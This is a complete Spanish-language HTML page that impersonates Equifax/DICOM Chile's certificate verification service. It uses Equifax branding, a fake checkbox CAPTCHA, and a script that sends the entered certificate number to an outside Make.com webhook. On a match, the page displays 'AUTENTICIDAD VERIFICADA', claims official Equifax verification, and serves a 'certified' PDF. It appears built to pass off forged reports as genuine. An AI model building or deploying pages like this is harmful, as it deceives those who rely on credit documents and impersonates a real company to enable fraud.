<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verificación de Certificados o Informes – Equifax</title>
  <link href="https://fonts.googleapis.com/css2?family=Source+Sans+3:wght@300;400;600;700&display=swap" rel="stylesheet"/>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: 'Source Sans 3', sans-serif; background: #f2f2f2; color: #333; min-height: 100vh; display: flex; flex-direction: column; }

    /* ── HEADER ── */
    .site-header { background: #8b0000; padding: 14px 48px; display: flex; align-items: center; }
    .site-header img { height: 34px; object-fit: contain; filter: brightness(0) invert(1); }

    /* ── MAIN CONTENT ── */
    main { flex: 1; padding: 48px; max-width: 900px; margin: 0 auto; width: 100%; }
    main h1 { font-size: 1.5rem; font-weight: 600; color: #333; margin-bottom: 36px; }

    /* ── FIELDS ── */
    .field-section { margin-bottom: 28px; }
    .field-section label { display: block; font-size: 0.9rem; color: #c0392b; font-weight: 600; margin-bottom: 8px; }
    .underline-input { width: 100%; border: none; border-bottom: 1px solid #aaa; background: transparent; padding: 8px 0; font-size: 1rem; font-family: 'Source Sans 3', sans-serif; outline: none; }
    .underline-input:focus { border-bottom-color: #8b0000; }
    
    .underline-select-wrap { position: relative; border-bottom: 1px solid #aaa; display: flex; align-items: center; }
    .underline-select { width: 100%; border: none; background: transparent; padding: 8px 28px 8px 0; font-size: 1rem; font-family: 'Source Sans 3', sans-serif; outline: none; appearance: none; cursor: pointer; }

    /* ── CAPTCHA & BUTTON ── */
    .bottom-row { display: flex; align-items: center; justify-content: space-between; margin-top: 8px; flex-wrap: wrap; gap: 12px; }
    .recaptcha-box { border: 1px solid #c8c8c8; border-radius: 3px; background: #f9f9f9; padding: 14px 18px; display: flex; align-items: center; gap: 14px; min-width: 280px; }
    .captcha-checkbox { width: 22px; height: 22px; border: 2px solid #c8c8c8; border-radius: 2px; background: #fff; cursor: pointer; display: flex; align-items: center; justify-content: center; }
    .captcha-checkbox.checked { border-color: #4a9c4a; background: #4a9c4a; }
    .captcha-checkbox.checked::after { content: '✓'; color: #fff; font-size: 14px; font-weight: 700; }
    
    .btn-consultar { background: #d8d8d8; color: #888; border: none; padding: 10px 28px; font-family: 'Source Sans 3', sans-serif; font-size: 0.92rem; cursor: not-allowed; border-radius: 2px; transition: all .2s; }
    .btn-consultar.ready { background: #8b0000; color: #fff; cursor: pointer; }
    .btn-consultar.ready:hover { background: #6a0000; }

    /* ── SPINNER / RESULT ── */
    .spinner { display: none; text-align: center; padding: 20px 0; }
    .spinner.active { display: block; }
    .spinner svg { animation: spin .9s linear infinite; }
    @keyframes spin { to { transform: rotate(360deg); } }

    .result-box { display: none; margin-top: 24px; border-radius: 4px; overflow: hidden; border: 1px solid #ddd; }
    .result-box.visible { display: block; }
    .result-header { padding: 12px 16px; font-weight: 600; font-size: 0.9rem; }
    .result-body { padding: 16px; background: #fff; }

    /* ── FOOTER ── */
    footer { background: #565656; color: #ccc; padding: 32px 48px; margin-top: auto; display: flex; justify-content: space-between; flex-wrap: wrap; gap: 20px; font-size: 0.78rem; }
    
    /* ── MOBILE RESPONSIVE ── */
    @media (max-width: 768px) {
      .site-header { padding: 14px 16px; }
      main { padding: 24px 16px; }
      .bottom-row { flex-direction: column; align-items: stretch; }
      .recaptcha-box { min-width: auto; width: 100%; justify-content: center; }
      .btn-consultar { width: 100%; margin-top: 10px; }
      footer { padding: 32px 16px; flex-direction: column; text-align: center; }
    }
  </style>
</head>
<body>

<div class="site-header">
  <img src="https://49659256.fs1.hubspotusercontent-na1.net/hubfs/49659256/PDFS/LOGOS%20AFP/LOGO%20DICOM.png" alt="Equifax"/>
</div>

<main>
  <h1>Verificación de Certificados o Informes</h1>
  <div class="field-section">
    <label>N° de Certificado:*</label>
    <input type="text" class="underline-input" id="certificado" placeholder="" oninput="checkReady()"/>
  </div>
  <div class="field-section">
    <label>País:*</label>
    <div class="underline-select-wrap">
      <select class="underline-select" id="pais" onchange="checkReady()">
        <option value="">--Seleccione--</option>
        <option value="CL">Chile</option>
      </select>
    </div>
  </div>

  <div class="bottom-row">
    <div class="recaptcha-box">
      <div class="captcha-checkbox" id="captcha-box" onclick="toggleCaptcha()"></div>
      <span>No soy un robot</span>
    </div>
    <button class="btn-consultar" id="btn-consultar" onclick="validar()">Consultar</button>
  </div>

  <div class="spinner" id="spinner">
    <svg width="32" height="32" viewBox="0 0 24 24" fill="none">
      <circle cx="12" cy="12" r="10" stroke="#e0e0e0" stroke-width="3"/>
      <path d="M12 2a10 10 0 0 1 10 10" stroke="#8b0000" stroke-width="3" stroke-linecap="round"/>
    </svg>
  </div>

  <div class="result-box" id="result-box">
    <div class="result-header" id="result-header"></div>
    <div class="result-body" id="result-body"></div>
  </div>
</main>

<footer>
  <div><p>Copyright 2023 Equifax Inc. Todos los derechos reservados.</p></div>
  <div><p>Servicio al Cliente 600-3784329</p></div>
</footer>

<script>
  const WEBHOOK = 'https://hook.us2.make.com/iq6ps3txx1jaxr91mje7sx47ynbta3kb';
  let captchaChecked = false;

  function toggleCaptcha() {
    captchaChecked = !captchaChecked;
    document.getElementById('captcha-box').classList.toggle('checked', captchaChecked);
    checkReady();
  }

  function checkReady() {
    const btn = document.getElementById('btn-consultar');
    if (document.getElementById('certificado').value.trim() && document.getElementById('pais').value && captchaChecked) {
      btn.classList.add('ready'); btn.disabled = false;
    } else { btn.classList.remove('ready'); btn.disabled = true; }
  }

  function abrirPDF(b64) {
    let base64 = b64.startsWith('data:') ? b64.split(',')[1] : b64;
    const binary = atob(base64); const array = new Uint8Array(binary.length);
    for(let i=0; i<binary.length; i++) array[i] = binary.charCodeAt(i);
    const url = URL.createObjectURL(new Blob([array], {type: 'application/pdf'}));
    window.open(url, '_blank');
  }

  async function validar() {
    const uuid = document.getElementById('certificado').value.trim();
    if (!uuid || !captchaChecked) return;
    
    document.getElementById('btn-consultar').disabled = true;
    document.getElementById('spinner').classList.add('active');
    document.getElementById('result-box').classList.remove('visible');

    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 30000);

    try {
      const res = await fetch(WEBHOOK, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ uuid: uuid, afp: 'DICOM' }), signal: controller.signal
      });
      clearTimeout(timeout); const data = await res.json();
      document.getElementById('spinner').classList.remove('active');
      
      const box = document.getElementById('result-box'), hdr = document.getElementById('result-header'), bdy = document.getElementById('result-body');
      
      if (data.found === true && data.pdf) {
        hdr.className = 'result-header success';
        hdr.style.background = '#f2f2f2'; hdr.style.color = '#8b0000'; hdr.style.borderBottom = '2px solid #8b0000';
        hdr.innerHTML = `🔒 AUTENTICIDAD VERIFICADA`;
        bdy.innerHTML = `
          <div style="border:1px dashed #8b0000; padding:20px; text-align:center; background:#fffaf9; border-radius:4px;">
            <p style="color:#333; font-weight:700; font-size:1.1rem; margin-bottom:8px;">${data.name || 'Informe Comercial Válido'}</p>
            <p style="color:#666; font-size:0.85rem; margin-bottom:20px;">Este documento ha sido emitido y verificado a través de las plataformas oficiales de Equifax.</p>
            <button onclick="abrirPDF('${data.pdf}')" style="background:#8b0000; color:#fff; border:none; padding:10px 20px; border-radius:2px; cursor:pointer; font-weight:bold;">📄 Descargar Copia Certificada</button>
          </div>`;
      } else if (data.found === false) {
        hdr.className = 'result-header error'; 
        hdr.style.background = '#ffebee'; hdr.style.color = '#c62828'; hdr.style.borderBottom = '2px solid #c62828';
        hdr.innerHTML = `❌ Documento no verificado`;
        bdy.innerHTML = `<p style="color:#555;font-size:0.9rem;">El número de certificado no existe en la base de datos.</p>`;
      } else {
        hdr.className = 'result-header error'; hdr.innerHTML = '⚠️ Error inesperado';
      }
      box.classList.add('visible');
    } catch(err) {
      clearTimeout(timeout); document.getElementById('spinner').classList.remove('active');
      const box = document.getElementById('result-box');
      document.getElementById('result-header').innerHTML = '⚠️ Error de conexión.';
      box.classList.add('visible');
    } finally { checkReady(); }
  }
</script>
</body>
</html>
